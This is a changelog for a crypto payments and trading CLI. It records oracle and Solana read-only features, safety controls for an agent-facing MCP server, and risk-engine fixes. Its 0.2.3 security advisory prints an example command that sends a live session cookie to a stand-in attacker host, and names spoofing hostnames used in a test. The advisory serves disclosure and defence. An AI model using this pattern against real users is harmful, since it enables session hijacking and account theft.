# Changelog

All notable changes to `@furlpay/cli`.

This project follows [Semantic Versioning](https://semver.org/). While the
version is `0.x`, the public CLI surface may still change between minor
releases; patch releases are always safe to take.

## Unreleased

Oracles & Solana live read-only surface (2026-11-17 gap report, Gaps 2 + 5).

### Added

- **Oracle layer** (`furlpay oracle price|sources`, MCP `furlpay_oracle_price`) —
  live multi-source USD quotes fanned out across real public endpoints
  (Coinbase spot, Kraken ticker, Binance USDT-cross, Jupiter Solana), medianed
  and gated on per-asset cross-source agreement (±1–3%). Sanity bands per
  asset (SOL $1–$2000 mirroring the web app's clamp rule). DISAGREEMENT
  returns the per-source readings with a **null price** — a blend across
  disagreeing sources is exactly the fabrication the CLI refuses to print;
  UNAVAILABLE guesses nothing. An optional Pyth Hermes gateway provider is
  structurally inactive until `FURLPAY_PYTH_HERMES_URL` +
  `FURLPAY_PYTH_FEED_IDS` are configured (the public Hermes endpoint is
  auth-gated since Pyth Pro, September 2026 — no unverified feed IDs ship
  baked in), and it rejects stale publishes.
- **Solana live read-only surface** (`furlpay solana status|balance|price|quote`,
  MCP `furlpay_solana_cluster_status`) — real JSON-RPC reads against
  mainnet-beta (epoch/slot/block height, lamport balances, `SOLANA_RPC_URL`
  override) and indicative Jupiter price/route quotes. Addresses are
  validated as base58 before any request; RPC protocol and HTTP errors
  **throw** — never a synthetic slot or a fabricated route. Every output
  states that this build has no Solana signing path: quotes are labeled
  `INDICATIVE` routing information nothing in this CLI can fill. Execution
  (when it ships) will go through the capability registry's live gate — this
  module deliberately contains no signing path.
- MCP server gains two read-only tools (35 total):
  `furlpay_oracle_price`, `furlpay_solana_cluster_status`.
- New offline regression suites: `test/oracle.test.js` (14 tests — agreement
  gate, sanity bands, per-provider real-shape parsing, Pyth staleness),
  `test/solana-live.test.js` (15 tests — fail-closed address validation,
  RPC error surfacing, integer-amount enforcement, INDICATIVE labeling).



### Security (readiness P7 — MCP defaults & human-in-the-loop)

- **A fresh `furlpay mcp` cannot move funds.** The server now defaults to
  READ-ONLY mode: every value-moving tool (settle invoice, treasury sweep,
  trades, perps, cancels, payments) is structurally ABSENT from tools/list
  and refused by the dispatcher. Execution requires `--enable-execution`
  (or `--mode execution`) AND an already-configured agent policy file — the
  policy is refused at startup otherwise, before any tool call is possible.
- **Two-phase execution.** Mutating tools can no longer be called directly
  even in execution mode (`TWO_PHASE_REQUIRED`). `furlpay_preview_execution`
  binds sanitized arguments to a one-time hash and shows the net effect;
  `furlpay_confirm_execution` is the only path that executes — single-use,
  10-minute TTL, re-running the agent policy gate on the STORED amount, so a
  confirm call can never smuggle a bigger number past the spend caps.
- **Untrusted-data sanitizer + injection eval suite.** Venue strings, asset
  names, memos and x402 headers are data: control characters and ANSI
  escapes stripped, length-capped, and hash-bound before any downstream use.
  An adversarial fixture suite (prompt-injection payloads in tool names,
  arguments and memos; proto-pollution; rate-limit hammering) runs in CI.
- **Per-call audit trail.** Every MCP call — allowed or refused — appends an
  audit line (agent identity, mode, tool, args HASH, verdict) to
  `~/.furlpay/mcp-audit.jsonl`; raw untrusted arguments never enter the log.
  Mutating calls are rate-limited (30/min rolling default) and attempts
  count even when the policy gate refuses them.
- `lib/mcp.js` JS surface gets the same structural default: mutating tools
  hidden from tools/list, dispatcher backstop, startup policy check.
  `swap_tokens`, `earn_withdraw` and `set_card_controls` now carry the same
  honest annotations the other mutating tools had.

Remediation of the 2026-11-17 external audit verification (gap-closure branch).

### Security

- **Risk engine is fail-closed.** The fat-finger guard's empty `catch`
  silently skipped the check on L2-book failures; asset-metadata failures
  crashed instead of refusing; and the margin buffer check was gated on an
  optional `userState` the live path never supplied, so insufficient equity
  passed straight through to a signed order. All three now refuse the order
  (`RISK_UNAVAILABLE: … fail-closed`), and `executePerpOrder` fetches live
  clearinghouse state before every evaluation — failing closed if it can't.
- **Trading signer refuses administrative actions.** The production L1
  signer inherits the admin-action guard: `withdraw3` / `usdSend` /
  `spotUser` throw `SECURITY_VIOLATION` on the trading-key path; the master
  key route (`signUserAction`) remains the only legitimate one.

### Added

- **Live USDC peg guardrail.** `UsdcPegMonitor.updatePrice()` was never
  called anywhere, so the depeg monitor sat at zero readings forever and its
  neutral fallback read as a permanent clean bill of health. Every pre-trade
  evaluation now ingests USDC/USD via `UsdcPegFeed` (CoinGecko simple-price
  default; `FURLPAY_USDC_PEG_FEED_URL` override — https-only, 5s timeout,
  sanity-bounded, refreshed at most once per 30s). Drift > 25 bps halts
  risk-increasing orders with the 5-minute recovery hysteresis. A feed
  outage is never depeg evidence — and never recovery evidence: a halt in
  force persists until real data proves recovery. Orders that pass without
  fresh peg data carry an explicit `PEG_FEED_UNAVAILABLE` warning, surfaced
  as `riskWarnings` on `PerpExecutionResult`.
- `.env.example` documenting every environment variable, and `dotenv` is
  actually loaded so documented vars work without shell exports.

### Fixed

- **Money math on trading paths is scaled-BigInt end to end.** Risk-engine
  notional/turnover/margin, perp notional/margin/liquidation estimates, HLP
  share estimates, the Binance mandate-gate notional, SOR receive/minimum
  amounts, and order fill accumulation all moved off IEEE-754 products of
  floats onto `DecimalMath` (6-dp minor units); the previously orphaned
  module is now load-bearing. `computeLiquidationPrice` /
  `computeProtocolLiquidationPrice` are integer-exact for integer leverage.
- **The "durable" event store actually persists.** File-backed appends
  through atomic temp-file+rename (`~/.furlpay/blotter/events.json`), schema
  and hash-chain verification on load, and corrupt or invalid ledgers refuse
  to extend rather than silently truncating. The bare constructor stays
  in-memory for tests (`isPersistent()` distinguishes).
- **Honesty copy:** the fabricated `wallet connect ledger` balance line
  ("Balance: 14,500.00 USDC"), the CCTP-v2 rail claim in the quant-terminal
  header, and the "sign with KMS" confirmation copy are corrected to what
  the build actually does.

### Docs

- Honesty matrix (README + docs site) gains a dedicated peg-guardrail row and
  a fail-closed note on perp execution; the Hyperliquid guide documents the
  risk engine's fail-closed semantics and the peg feed.

## 0.4.0 — 2026-11-13

> Note: the `0.3.x` line was developed in the internal monorepo and never
> published to npm (the npm registry's previous release is `0.2.2`). This
> entry therefore consolidates everything shipping in the first npm release
> since `0.2.2`.

### Added

- **`furlpay update`** — installation-aware self-update command with
  `--check` (report only), `--latest`, `--version X.Y.Z` (explicit pin/rollback,
  confirmed before downgrading), and `--channel stable|beta`. Detects the
  install method (npm global / npx / Homebrew) and only self-updates npm
  installs; everything else gets the exact manual command. Update checks are
  anonymous (no credentials are ever transmitted) and can be disabled with
  `furlpay config set update.check false`.
- **`furlpay doctor` — Installation & Updates section**: install method,
  executable path, npm registry sanity, and latest-on-npm version.
- **Installers**: `install.sh` (Linux/macOS) and `install.ps1` (Windows) —
  secure npm-bootstrap scripts that verify the Node floor (≥ 22.19.0), warn on
  non-official registry mirrors, never use sudo/elevation, and verify the
  installed `furlpay --version` after install. Support `--version`,
  `--channel`, `--uninstall`, and `--dry-run`.
- **Release pipeline** (`.github/workflows/release.yml`): tag-driven
  (`v*.*.*`) — tag/package version consistency gate, typecheck, build, tests,
  `npm pack` tarball contents check, cross-OS smoke install (including an MCP
  stdio initialize/tools-list handshake), SHA-256 `checksums.txt`, CycloneDX
  SBOM, sigstore build-provenance attestations, GitHub Release, and
  provenance-bearing npm publish (OIDC trusted publishing, or a granular token
  via `NPM_PUBLISH_MODE=token`).
- `docs/INSTALLATION.md`, `docs/UPDATING.md`, `docs/RELEASING.md`,
  `docs/PACKAGING.md`.

### Changed

- **`engines.node` corrected from `>=18` to `>=22.19.0`.** The previous floor
  was false advertising: `undici@8` requires ≥ 22.19.0 and
  `@stellar/stellar-sdk@17` requires ≥ 22.12.0, so on Node 18–21 the CLI
  would crash on import. npm now refuses the install instead.
- Package `files` allowlist tightened: `src/` and `docs/` no longer ship in
  the tarball (they were dead weight in the published package — runtime uses
  `bin/`, `lib/`, and the compiled `dist/`).
- `npm publish` now carries `publishConfig.provenance` and
  `prepublishOnly` runs the full build/entrypoint/version-sync verification
  (`scripts/build.js`) instead of a bare compile.

### Fixed

- `@stellar/stellar-sdk` upgraded 15 → 17, clearing all 42 open Dependabot
  advisories.
- Escrow lifecycle hardening (fund/release require a real `--tx-hash`;
  unauthorized actors and malformed proof hashes fail closed).
- Honesty fixes in the TUI/RWA surfaces: fabricated HLP share-price/APY
  figures removed; live-vs-simulated labels enforced at runtime.
- Supply-chain: CI actions SHA-pinned; `mcp-publisher` pinned to v1.8.9;
  `ws` lockfile bumped to 8.23.0.

## 0.2.3 — 2026-08-10

### Security

**Fixed: the session cookie could be sent to an arbitrary host.**

`--api-base <url>` was used verbatim, `furlpay api <METHOD> <absolute-url>`
allowed a full URL where a path was expected, plain `http` was permitted, and
the `furlpay_session` cookie was attached to whatever host resulted. A
documented convenience flag was therefore a credential-exfiltration primitive:

```
furlpay api GET https://attacker.example/x   →   Cookie: furlpay_session=...
```

Anyone who could persuade a logged-in user to run a command with an
attacker-supplied `--api-base`, or paste a command containing an absolute URL,
could capture a live session.

The cookie is now withheld unless the resolved target is `furlpay.com` (or a
subdomain) over TLS, or loopback (`localhost`, `127.0.0.1`, `::1`) for local
development. Requests to other hosts still run — an untrusted base is often a
legitimate local mock — they simply carry no credential, and the CLI says so on
stderr rather than failing later with a confusing `401`.

Plain `http` to a real host is untrusted even when the hostname is correct: a
cookie sent in the clear is a cookie disclosed to everything on the path.

- **Affected:** `<= 0.2.2`
- **Fixed in:** `0.2.3`
- **Action:** upgrade with `npm i -g @furlpay/cli@latest`. If you ran the CLI
  against a host you do not control, run `furlpay logout` (or `furlpay login`
  again) to rotate the session.

Covered by `test/credential-trust.test.js`, which pins the boundary including
the suffix-confusion cases a naive `endsWith("furlpay.com")` would accept
(`furlpay.com.evil.example`, `evilfurlpay.com`) and the cloud metadata address.

### Packaging

- Added `repository`, `homepage` and `bugs` metadata.
- Enabled `publishConfig.provenance` so published builds carry a verifiable
  link to the source and build that produced them.

## 0.2.2 and earlier

See the release history on npm and the commit log.
